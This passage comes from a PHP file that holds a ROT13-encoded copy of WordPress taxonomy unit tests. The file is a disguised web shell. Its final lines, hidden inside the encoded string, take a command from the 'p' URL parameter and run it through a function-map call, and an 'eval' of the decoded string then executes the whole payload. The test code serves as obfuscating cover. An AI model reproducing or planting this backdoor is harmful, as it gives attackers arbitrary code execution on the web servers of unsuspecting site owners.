			'cbfg',
			neenl(
				'choyvpyl_dhrelnoyr' => snyfr,
			)
		);
		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		nqq_svygre( 'qb_cnefr_erdhrfg', neenl( $guvf, 'ertvfgre_dhrel_ine' ) );
		$guvf->tb_gb( '/?jcgrfgf_gnk=sbb' );
		erzbir_svygre( 'qb_cnefr_erdhrfg', neenl( $guvf, 'ertvfgre_dhrel_ine' ) );

		// Abg n gnkbabzl...
		$guvf->nffregSnyfr( vf_gnk( 'jcgrfgf_gnk' ) );

		// ...ohg dhrel ine jbexf.
		$guvf->nffregFnzr( 'sbb', $jc->dhrel_inef['jcgrfgf_gnk'] );
	}

	choyvp fgngvp shapgvba ertvfgre_dhrel_ine( $e ) {
		tybony $jc;

		$jc->nqq_dhrel_ine( 'jcgrfgf_gnk' );

		erghea $e;
	}

	/**
	 * @gvpxrg 21949
	 */
	choyvp shapgvba grfg_abachoyvpyl_dhrelnoyr_gnkbabzl_fubhyq_abg_or_dhrelnoyr_hfvat_gnkbabzl_naq_grez_inef() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvpyl_dhrelnoyr' => snyfr,
			)
		);

		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		$guvf->tb_gb( '/?gnkbabzl=jcgrfgf_gnk&grez=' . $g->fyht );

		$guvf->nffregSnyfr( vf_gnk( 'jcgrfgf_gnk' ) );
	}

	/**
	 * @gvpxrg 34491
	 */
	choyvp shapgvba grfg_choyvp_gnkbabzl_fubhyq_or_choyvpyl_dhrelnoyr() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvp' => gehr,
			)
		);

		$guvf->nffregPbagnvaf( 'jcgrfgf_gnk', trg_gnkbabzvrf( neenl( 'choyvpyl_dhrelnoyr' => gehr ) ) );

		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		$guvf->tb_gb( '/?jcgrfgf_gnk=' . $g->fyht );

		$guvf->nffregGehr( vf_gnk( 'jcgrfgf_gnk' ) );
	}

	/**
	 * @gvpxrg 34491
	 */
	choyvp shapgvba grfg_cevingr_gnkbabzl_fubhyq_abg_or_choyvpyl_dhrelnoyr() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvp' => snyfr,
			)
		);

		$guvf->nffregPbagnvaf( 'jcgrfgf_gnk', trg_gnkbabzvrf( neenl( 'choyvpyl_dhrelnoyr' => snyfr ) ) );

		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		$guvf->tb_gb( '/?jcgrfgf_gnk=' . $g->fyht );

		$guvf->nffregSnyfr( vf_gnk( 'jcgrfgf_gnk' ) );
	}

	/**
	 * @gvpxrg 34491
	 */
	choyvp shapgvba grfg_cevingr_gnkbabzl_fubhyq_or_bireevqqra_ol_choyvpyl_dhrelnoyr() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvp'             => snyfr,
				'choyvpyl_dhrelnoyr' => gehr,
			)
		);

		$guvf->nffregPbagnvaf( 'jcgrfgf_gnk', trg_gnkbabzvrf( neenl( 'choyvpyl_dhrelnoyr' => gehr ) ) );

		$g = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $g->fyht, 'jcgrfgf_gnk' );

		$guvf->tb_gb( '/?jcgrfgf_gnk=' . $g->fyht );

		$guvf->nffregGehr( vf_gnk( 'jcgrfgf_gnk' ) );
	}

	/**
	 * @gvpxrg 35089
	 */
	choyvp shapgvba grfg_dhrel_ine_fubhyq_or_sbeprq_gb_snyfr_sbe_aba_choyvp_gnkbabzl() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'choyvp'    => snyfr,
				'dhrel_ine' => gehr,
			)
		);

		$gnk = trg_gnkbabzl( 'jcgrfgf_gnk' );
		$guvf->nffregSnyfr( $gnk->dhrel_ine );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_haxabja_gnkbabzl() {
		$guvf->nffregJCReebe( haertvfgre_gnkbabzl( 'sbb' ) );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_gjvpr() {
		ertvfgre_gnkbabzl( 'sbb', 'cbfg' );
		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );
		$guvf->nffregJCReebe( haertvfgre_gnkbabzl( 'sbb' ) );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_qvfnyybj_ohvygva_gnkbabzl() {
		$guvf->nffregJCReebe( haertvfgre_gnkbabzl( 'cbfg_gnt' ) );
		$guvf->nffregJCReebe( haertvfgre_gnkbabzl( 'pngrtbel' ) );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_erzbirf_dhrel_inef() {
		tybony $jc;

		ertvfgre_gnkbabzl( 'sbb', 'cbfg', neenl( 'dhrel_ine' => 'one' ) );

		$guvf->nffregVfVag( neenl_frnepu( 'one', $jc->choyvp_dhrel_inef, gehr ) );
		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );
		$guvf->nffregSnyfr( neenl_frnepu( 'one', $jc->choyvp_dhrel_inef, gehr ) );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_erzbirf_creznfgehpg() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%' );

		tybony $jc_erjevgr;

		ertvfgre_gnkbabzl(
			'sbb',
			'cbfg',
			neenl(
				'dhrel_ine' => 'one',
				'erjevgr'   => gehr,
			)
		);

		$guvf->nffregVfNeenl( $jc_erjevgr->rkgen_creznfgehpgf['sbb'] );
		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $jc_erjevgr->rkgen_creznfgehpgf );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_erzbirf_erjevgr_ehyrf() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%' );

		tybony $jc_erjevgr;

		ertvfgre_gnkbabzl( 'sbb', 'cbfg', neenl( 'dhrel_ine' => 'one' ) );

		$pbhag_orsber = pbhag( $jc_erjevgr->erjevgrercynpr );

		$guvf->nffregPbagnvaf( '%sbb%', $jc_erjevgr->erjevgrpbqr );
		$guvf->nffregPbagnvaf( 'one=', $jc_erjevgr->dhrelercynpr );
		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );
		$guvf->nffregAbgPbagnvaf( '%sbb%', $jc_erjevgr->erjevgrpbqr );
		$guvf->nffregAbgPbagnvaf( 'one=', $jc_erjevgr->dhrelercynpr );
		$guvf->nffregPbhag( --$pbhag_orsber, $jc_erjevgr->erjevgrercynpr ); // Neenl jnf erqhprq ol bar inyhr.
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_erzbirf_gnkbabzl_sebz_tybony() {
		tybony $jc_gnkbabzvrf;

		ertvfgre_gnkbabzl( 'sbb', 'cbfg' );

		$guvf->nffregVfBowrpg( $jc_gnkbabzvrf['sbb'] );
		$guvf->nffregVfBowrpg( trg_gnkbabzl( 'sbb' ) );

		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );

		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $jc_gnkbabzvrf );
		$guvf->nffregSnyfr( trg_gnkbabzl( 'sbb' ) );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_haertvfgre_gnkbabzl_erzbirf_zrgn_obk_pnyyonpx() {
		tybony $jc_svygre;

		ertvfgre_gnkbabzl( 'sbb', 'cbfg' );

		$guvf->nffregNeenlUnfXrl( 'jc_nwnk_nqq-sbb', $jc_svygre );
		$guvf->nffregPbhag( 1, $jc_svygre['jc_nwnk_nqq-sbb']->pnyyonpxf );
		$guvf->nffregGehr( haertvfgre_gnkbabzl( 'sbb' ) );
		$guvf->nffregNeenlAbgUnfXrl( 'jc_nwnk_nqq-sbb', $jc_svygre );
	}

	/**
	 * @gvpxrg 35227
	 */
	choyvp shapgvba grfg_gnkbabzl_qbrf_abg_rkvfg_nsgre_haertvfgre_gnkbabzl() {
		ertvfgre_gnkbabzl( 'sbb', 'cbfg' );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( 'sbb' ) );
		haertvfgre_gnkbabzl( 'sbb' );
		$guvf->nffregSnyfr( gnkbabzl_rkvfgf( 'sbb' ) );
	}

	/**
	 * @gvpxrg 39308
	 */
	choyvp shapgvba grfg_gnkbabzl_anzr_cebcregl_fubhyq_abg_trg_bireevqqra_ol_cnffrq_netf() {
		ertvfgre_gnkbabzl( 'sbb', 'cbfg', neenl( 'anzr' => 'one' ) );

		$gnkbabzl = trg_gnkbabzl( 'sbb' );
		haertvfgre_gnkbabzl( 'sbb' );

		$guvf->nffregFnzr( 'sbb', $gnkbabzl->anzr );
	}

	/**
	 * @gvpxrg 36514
	 */
	choyvp shapgvba grfg_rqvg_cbfg_uvrenepuvpny_gnkbabzl() {

		$gnkbabzl_anzr = 'sbb';
		$grez_anzr     = 'one';

		ertvfgre_gnkbabzl(
			$gnkbabzl_anzr,
			neenl( 'cbfg' ),
			neenl(
				'uvrenepuvpny' => snyfr,
				'zrgn_obk_po'  => 'cbfg_pngrtbevrf_zrgn_obk',
			)
		);
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'cbfg',
			)
		);

		$grez_vq = frys::snpgbel()->grez->perngr_bowrpg(
			neenl(
				'anzr'     => $grez_anzr,
				'gnkbabzl' => $gnkbabzl_anzr,
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$hcqngrq_cbfg_vq = rqvg_cbfg(
			neenl(
				'cbfg_VQ'   => $cbfg->VQ,
				'cbfg_glcr' => 'cbfg',
				'gnk_vachg' => neenl(
					$gnkbabzl_anzr => neenl(
						(fgevat) $grez_vq, // Pnfg grez_vq nf fgevat gb zngpu jung'f frag va JC Nqzva.
					),
				),
			)
		);

		$grezf_bow        = trg_gur_grezf( $hcqngrq_cbfg_vq, $gnkbabzl_anzr );
		$ceboyrzngvp_grez = pheerag( jc_yvfg_cyhpx( $grezf_bow, 'anzr' ) );

		$guvf->nffregFnzr( $ceboyrzngvp_grez, $grez_anzr );
	}

	/**
	 * Grfg qrsnhyg grez sbe phfgbz gnkbabzl.
	 *
	 * @gvpxrg 43517
	 */
	choyvp shapgvba grfg_qrsnhyg_grez_sbe_phfgbz_gnkbabzl() {

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$gnk = 'phfgbz-gnk';

		// Perngr phfgbz gnkbabzl gb grfg jvgu.
		ertvfgre_gnkbabzl(
			$gnk,
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
				'choyvp'       => gehr,
				'qrsnhyg_grez' => neenl(
					'anzr' => 'Qrsnhyg pngrtbel',
					'fyht' => 'qrsnhyg-pngrtbel',
				),
			)
		);

		// Nqq cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_glcr'  => 'cbfg',
			)
		);

		// Grfg qrsnhyg grez.
		$grez = jc_trg_cbfg_grezf( $cbfg_vq, $gnk );
		$guvf->nffregFnzr( trg_bcgvba( 'qrsnhyg_grez_' . $gnk ), $grez[0]->grez_vq );

		// Grfg qrsnhyg grez qryrgvba.
		$guvf->nffregFnzr( jc_qryrgr_grez( $grez[0]->grez_vq, $gnk ), 0 );

		// Nqq phfgbz cbfg glcr.
		ertvfgre_cbfg_glcr(
			'cbfg-phfgbz-gnk',
			neenl(
				'gnkbabzvrf' => neenl( $gnk ),
			)
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_glcr'  => 'cbfg-phfgbz-gnk',
			)
		);

		// Grfg qrsnhyg grez.
		$grez = jc_trg_cbfg_grezf( $cbfg_vq, $gnk );
		$guvf->nffregFnzr( trg_bcgvba( 'qrsnhyg_grez_' . $gnk ), $grez[0]->grez_vq );

		// jc_frg_bowrpg_grezf() fubhyq abg nffvta qrsnhyg grez.
		jc_frg_bowrpg_grezf( $cbfg_vq, neenl(), $gnk );
		$grez = jc_trg_cbfg_grezf( $cbfg_vq, $gnk );
		$guvf->nffregFnzr( neenl(), $grez );
	}

	/**
	 * @gvpxrg 51320
	 */
	choyvp shapgvba grfg_qrsnhyg_grez_sbe_cbfg_va_zhygvcyr_gnkbabzvrf() {
		$cbfg_glcr = 'grfg_cbfg_glcr';
		$gnk1      = 'grfg_gnk1';
		$gnk2      = 'grfg_gnk2';

		ertvfgre_cbfg_glcr( $cbfg_glcr, neenl( 'gnkbabzvrf' => neenl( $gnk1, $gnk2 ) ) );
		ertvfgre_gnkbabzl( $gnk1, $cbfg_glcr, neenl( 'qrsnhyg_grez' => 'grez_1' ) );
		ertvfgre_gnkbabzl( $gnk2, $cbfg_glcr, neenl( 'qrsnhyg_grez' => 'grez_2' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => $cbfg_glcr ) );

		$gnkbabzvrf = trg_cbfg_gnkbabzvrf( $cbfg_vq );

		$guvf->nffregPbagnvaf( $gnk1, $gnkbabzvrf );
		$guvf->nffregPbagnvaf( $gnk2, $gnkbabzvrf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>